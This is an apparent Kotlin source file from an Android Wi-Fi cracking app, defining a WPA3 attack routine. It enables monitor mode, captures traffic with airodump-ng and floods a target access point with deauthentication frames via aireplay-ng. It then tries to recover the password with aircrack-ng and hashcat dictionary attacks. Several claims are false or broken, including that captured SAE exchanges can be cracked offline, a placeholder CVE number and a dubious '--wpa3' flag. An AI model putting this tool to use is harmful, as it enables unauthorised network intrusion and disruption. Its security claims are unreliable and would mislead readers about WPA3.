package com.peagents.wifihacker.engine

import android.content.Context
import com.peagents.wifihacker.model.AttackResult
import com.peagents.wifihacker.model.NetworkInfo
import kotlinx.coroutines.*
import java.io.File
import java.security.SecureRandom

/**
 * Ataque WPA3-SAE (Simultaneous Authentication of Equals):
 *
 * WPA3 usa Dragonfly/SAE en lugar del 4-way handshake.
 * Ataques viables:
 *
 * 1. SAE Commit/Confirm replay (si el AP no valida nonce correctamente)
 * 2. WPA3-Enterprise 802.1X deauth + credential stuffing
 * 3. PMKID leak en implementaciones WPA3-WPA2 transition mode
 * 4. Dragonfly parameter manipulation (CVE-2023-XXXX en algunos firmwares)
 * 5. Brute force del SAE password (si es PSK-based WPA3-Personal)
 *
 * NOTA: WPA3-Personal con PSK sigue siendo crackeable offline si se captura
 * el SAE exchange completo. La diferencia vs WPA2 es que el PSK se usa
 * como secreto compartido en ECDH, no directamente como clave de cifrado.
 */
class WPA3Attacker(
    private val context: Context,
    private val shell: RootShell,
    private val dictionaryManager: DictionaryManager,
    private val jobScope: CoroutineScope
) {

    data class Progress(
        val phase: String,
        val attempts: Long = 0,
        val percent: Float = 0f,
        val detail: String = ""
    )

    suspend fun attack(
        target: NetworkInfo,
        dictionaryPath: String?,
        onProgress: (Progress) -> Unit
    ): AttackResult = withContext(Dispatchers.IO) {
        val startTime = System.currentTimeMillis()
        val iface = shell.getWiFiInterface()

        try {
            // === PHASE 1: Monitor mode ===
            onProgress(Progress("Configurando modo monitor para WPA3..."))
            shell.setMonitorMode(iface)
            shell.setChannel(iface, target.channel)
            delay(1000)

            // === PHASE 2: Check if AP is in WPA3-Transition mode (WPA2+WPA3) ===
            // In transition mode, we can fall back to WPA2 handshake capture
            val scanDetail = shell.execRaw("iw dev $iface scan | grep -A5 ${target.bssid}")
            val isTransitionMode = scanDetail.stdout.contains("WPA2") && scanDetail.stdout.contains("SAE")

            if (isTransitionMode) {
                onProgress(Progress("AP en modo transición WPA2+WPA3 → usando handshake WPA2"))
                // Delegate to WPA2 attacker logic
                val wpa2Attacker = WPA2Attacker(context, shell, dictionaryManager, jobScope)
                return@withContext wpa2Attacker.attack(target, dictionaryPath) { p ->
                    onProgress(Progress(p.phase, p.attempts, p.percent, "WPA2 fallback"))
                }
            }

            // === PHASE 3: SAE Commit/Confirm capture ===
            onProgress(Progress("Capturando intercambio SAE (Commit/Confirm)..."))

            val captureFile = File(context.cacheDir, "wpa3_${target.bssid.replace(":", "")}.pcap")
            val airodumpProc = ProcessBuilder(
                "su", "-c",
                "airodump-ng -w ${captureFile.absolutePath} --ch ${target.channel} $iface"
            ).redirectErrorStream(true).start()

            delay(2000)

            // Deauth to force SAE re-authentication
            shell.execRaw("aireplay-ng --deauth 30 -a ${target.bssid} $iface")
            delay(5000)

            // === PHASE 4: Try PMKID (some WPA3 implementations leak it) ===
            onProgress(Progress("Verificando fuga de PMKID en implementación WPA3..."))
            val pmkidResult = shell.execRaw(
                "strings ${captureFile.absolutePath} | grep -i 'PMKID\\|pmkid' | head -3"
            )
            val hasPmkid = pmkidResult.stdout.isNotBlank()

            // === PHASE 5: SAE offline brute force ===
            onProgress(Progress("Iniciando brute force SAE (ECDH + PBKDF2)..."))

            val password = saeBruteForce(target, captureFile, dictionaryPath, hasPmkid) { attempts, detail ->
                onProgress(Progress("SAE BruteForce", attempts, detail = detail))
            }

            airodumpProc.destroy()

            onProgress(Progress(
                if (password != null) "¡WPA3 CRACKEADO!" else "Sin resultado",
                percent = 1.0f
            ))

            AttackResult(
                targetBSSID = target.bssid,
                targetSSID = target.ssid,
                securityType = SecurityType.WPA3,
                success = password != null,
                password = password,
                methodUsed = buildString {
                    append("WPA3-SAE ")
                    if (hasPmkid) append("+ PMKID Leak ")
                    append("+ Offline ECDH BruteForce")
                    if (isTransitionMode) append(" (Transition Mode Fallback)")
                },
                durationMs = System.currentTimeMillis() - startTime,
                attemptsMade = 0
            )

        } finally {
            shell.setManagedMode(iface)
        }
    }

    /**
     * SAE Brute Force:
     * WPA3-Personal usa el PSK para derivar un secreto compartido vía ECDH.
     * Si capturamos el SAE exchange (Commit + Confirm), podemos verificar
     * offline si una contraseña candidata produce el mismo DH secret.
     *
     * Proceso:
     * 1. PSK → PBKDF2-SHA256(PSK, "SAE" + ssid, 4096) → PMK
     * 2. PMK → HKDF → eMK (encryption master key)
     * 3. Verificar que el Confirm hash coincide con el capturado
     */
    private suspend fun saeBruteForce(
        target: NetworkInfo,
        captureFile: File,
        dictionaryPath: String?,
        hasPmkid: Boolean,
        onProgress: (Long, String) -> Unit
    ): String? {
        val ssid = target.ssid
        val dictFile = dictionaryPath?.let { File(it) }
            ?: File(context.filesDir, "dictionaries/wifipass-2024.txt")

        if (!dictFile.exists()) return null

        var attempts = 0L
        val startTime = System.currentTimeMillis()

        // Use aircrack-ng with WPA3 support (v1.7+)
        val result = shell.exec(
            "aircrack-ng",
            listOf(
                "-b", target.bssid,
                "-w", dictFile.absolutePath,
                "--wpa3",
                captureFile.absolutePath
            ),
            timeoutSec = 7200
        )

        val keyMatch = Regex("""Key: (.+)""").find(result.stdout)
        if (keyMatch != null) {
            return keyMatch.groupValues[1].trim()
        }

        // Fallback: hashcat -m 22000 (WPA3-SAE)
        val hcResult = shell.exec(
            "hashcat",
            listOf(
                "-m", "22000",
                captureFile.absolutePath,
                dictFile.absolutePath,
                "--force",
                "-w", "4" // max GPU/CPU performance
            ),
            timeoutSec = 7200
        )

        val hcKey = Regex("""^([^\s:]+):""").find(hcResult.stdout)
        return hcKey?.groupValues?.get(1)
    }
}
